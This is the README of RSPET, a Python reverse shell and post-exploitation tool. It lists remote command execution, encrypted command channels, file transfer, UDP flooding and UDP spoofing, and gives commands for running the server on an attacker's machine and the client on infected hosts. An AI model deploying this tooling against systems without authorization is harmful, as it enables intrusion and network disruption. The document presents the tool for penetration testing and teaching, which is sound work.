# RSPET

![MIT Licence](https://img.shields.io/badge/Licence-MIT_Licence-red.svg?style=plastic)
[![Python 2.7](https://img.shields.io/badge/Python-2.7-yellow.svg?style=plastic)](https://www.python.org/)
![v0.4.0](https://img.shields.io/badge/Release-v0.4.0-orange.svg?style=plastic)
![Maintained](https://img.shields.io/badge/Maintained-Yes-green.svg?style=plastic)
[![Twitter](https://img.shields.io/badge/Twitter-@TheRSPET-blue.svg?style=plastic)](https://twitter.com/theRSPET)

> RSPET (Reverse Shell and Post Exploitation Tool) is a Python based reverse shell equipped with functionalities that assist in a post exploitation scenario.

DISCLAIMER: This software is provided for educational and PenTesting purposes and as a proof of concept. The developer(s) do not endorse, incite or in any other way support unauthorized computer access and networks disruption.

NOTE: `min` folder has been removed. The added overhead of maintaining two versions lead to `min` not receiving bug-fixes and important updates. If there is interest, both in using and maintaining, a more bare-bone and simplistic version, a new branch will be created to host it.

Current Version: `v0.4.0`

Follow: [@TheRSPET](https://twitter.com/TheRSPET) on Twitter for updates.

Documentation : [rspet.readthedocs.io](http://rspet.readthedocs.io)

## Features

* Remote Command Execution
* ~~Trafic masking (XORed instead of cleartext); for better results use port 443~~[1]
* TLS Encryption of the Server-Client communication
* Built-in File/Binary transfer (both ways) over the ~~masked~~ Encrypted traffic
* Built-in UDP Flooding tool
* Built-in UDP Spoofing tool[2]
* Multiple/All Hosts management; order File/Binary transfer and UDP Flood from Multiple/All connected Hosts
* Modular Code Design to allow easy customization
* Client script is tested and is compatible with PyInstaller (can be made into .exe)[3]
* Full server side Plug-in support[4]
* Plug-in management, including the ability to Install(Download) and Dynamically Load Plug-ins.
* RESTful API for the Server Module

*[1]The idea for XORing as well as the skeleton for the client came from [primalsecurity.net](http://www.primalsecurity.net) so if you like this pack of scripts you'll probably love what they do

*[2]UDP Spoofing uses RAW_SOCKETS so in order to utilize it, the client has to run on an OS that supports RAW_SOCKETS (most Unix-Based) and with root privileges. Finally, most of the ISPs have implementations in place that will either drop or re-structure spoofed packets

*[3]Again check [primalsecurity.net's](http://www.primalsecurity.net) perfect blogpost about producing an .exe

*[4]Detailed documentation on creating Plug-ins available in [Online Documentation](http://rspet.readthedocs.io/en/latest/dev/)!

## Deployment:

* `rspet_server.py` is situated at the attacker's machine and running to accept connections
* `rspet_client.py` is situated in the infected machine(s) and will initiate the connection and wait for input.

## Installation

In order to install RSPET's Server Module:
```sh
pip install rspet-server
```
This will take care of all the core dependencies. In order install REST API's dependencies:
```sh
pip install rspet-server[rest]
```

## Execution:

* Server:
    ```sh
    rspet_server [-c #clients, --ip ipToBind, -p portToBind]
    ```
max_connections defaults to 5 if left blank

* RESTful API:
    ```sh
    rspet-server-rest [-c #clients, --ip ipToBind, -p portToBind]
    ```

* Client:
    ```sh
    python rspet_client.py <server_ip> [server_port]
    ```

Many changes can be made to fit individual needs.

As always if you have any suggestion, bug report or complain feel free to contact me.

## ASCIICAST

[![asciicast](https://asciinema.org/a/b94jozlbub4a3gir7oq6owlno.png)](https://asciinema.org/a/b94jozlbub4a3gir7oq6owlno?autoplay=1)

## Distros
> A list of Distros that contain RSPET

* [BlackArch Linux](http://blackarch.org/tools.html) (as of version 2016.04.28)
* [ArchStrike](https://archstrike.org/packages/search/rspet)

## As Featured in

* [seclist.us](http://seclist.us/rspet-reverse-shell-and-post-exploitation-tool.html)
* [sillycon.org](http://www.sillycon.org/stories/article/github-panagiksrspet-rspet-reverse-shell-and-post-exploitation-tool-is-a-python-based-reverse-shell-equipped-with-functionalities-that-assist-in-a-post-exploitation-scenario)
* [digitalmunition.me](https://www.digitalmunition.me/2016/04/rspet-reverse-shell-post-exploitation-tool/)
* [n0where.net](https://n0where.net/reverse-shell-post-exploitation-tool/)
* [kitploit.com](http://www.kitploit.com/2016/05/rspet-python-reverse-shell-and-post.html)
* [Hakin9 IT Security Magazine](https://www.facebook.com/hakin9mag/posts/1376368245710855)

## Todo

- [x] ~~Fix logic bug where if a direct command to Host OS has no output Server displays command not recognized~~
- [ ] Fix logic bug where if a direct command's to Host OS execution is perpetual the Server deadlocks
  - [ ] Investigate weather the issue resides in the Server logic or the linearity of the CLI.
- [x] ~~Add client version and type (min or full) as a property when client connects and at `List_Hosts`~~
- [x] Add TLS encryption in order to:
  - [x] Replace XORing (and subsequently obfuscation with encryption)
  - [ ] Verify the "authenticity" of clients
    - [ ] A mechanism to issue and verify client certificates
    - [ ] A mechanism to recognize compromised client certs
- [ ] Add client update mechanism (initial thought was the use of execv but it acts up)
- [x] Add a Plug-in system to client (a more compact one)
 - [x] Add remote installation of Plug-ins to client
 - [ ] Add installed Plug-ins report from client to server
 - [ ] Add check server side that a client plugin is present at the client before execution
- [ ] Add UDP Reflection functionality
- [ ] Provide more settings via config file
- [ ] Re-introduce multythreading when handling multiple hosts.
- [x] ~~Make commands available with 'Tab' automatically generated based on loaded Plug-ins.~~
- [x] ~~Fix logical bug when deleting a client. (Client still shows up on List_Hosts)~~
- [x] ~~Create comprehensive Plug-in creation guide.~~
- [ ] Add support for command overridding in server plugins
- [ ] Add dependency support for server plugins

## Styleguide

This project is following [Google's Python Styleguide](https://google.github.io/styleguide/pyguide.html) with a minor variation on the use of whitespaces to align ":" tokens.

## Contribution Opportunities

This project is open for contributors. If you have implemented a new feature, or maybe an improvement to the current code feel free to open a pull request. If you want to suggest a new feature open an issue. Additionally Testers are needed to run a few standard scenarios (and a few of their own maybe) to decrease the chance a bug slips into a new version. Should there be any interest about testing a `beta` branch will be created (where code to be tested will be uploaded) along with a list of scenarios. For a full guide on contribution opportunities and guides check out [the "Contributing" chapter on RSPET's Online Documentation](http://rspet.readthedocs.io/en/latest/contribute/)

## Author - Project Owner/Manager

[panagiks](https://twitter.com/panagiks)

## Co-Author

[dzervas](https://dzervas.gr) -- Code (Server OO-redesign, Server Plug-in system implementation, bug reports, bug fixes)

## Contributors

* [b3mb4m](https://github.com/b3mb4m) -- Code (tab.py and bug fixes)
* [junzy](https://github.com/junzy) -- Docstings (udp_spoof & udp_spoof_send)
* [gxskar](https://github.com/gxskar) -- Documentation (ASCIICAST of RSPET's basic execution)
* [n1zzo](https://github.com/n1zzo) -- Bug Report & Fix (PR [#31](https://github.com/panagiks/RSPET/pull/31))

## License

MIT

## Free Cake

                                       i.
                                       .7.
                                      .. :v
                                     c:  .x
                                      i.::
                                        :
                                       ..i..
                                      #MMMMM
                                      QM  AM
                                      9M  zM
                                      6M  AM
                                      2M  2MX#MM@1.
                                      0M  tMMMMMMMMMM;
                                 .X#MMMM  ;MMMMMMMMMMMMv
                             cEMMMMMMMMMU7@MMMMMMMMMMMMM@
                       .n@MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
                      MMMMMMMM@@#$BWWB#@@#$WWWQQQWWWWB#@MM.
                      MM                                ;M.
                      $M                                EM
                      WMO$@@@@@@@@@@@@@@@@@@@@@@@@@@@@#OMM
                      #M                                cM
                      QM                                tM
                      MM                                CMO
                   .MMMM                                oMMMt
                  1MO 6MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM iMM
                 .M1  BM                                VM  ,Mt
                 1M   @M .............................. WM   M6
                  MM  .A8OQWWWWWWWWWWWWWWWWWWWWWWWWWWW0Az2  #M
                   MM                                      MM.
                    @MMY                                vMME
                      UMMMbi                        i8MMMt
                         C@MMMMMbt;;i.......i;XQMMMMMMt
                              ;ZMMMMMMMMMMMMMMM@A;.

                    The Cake is a Lie. But it has been a Year :)
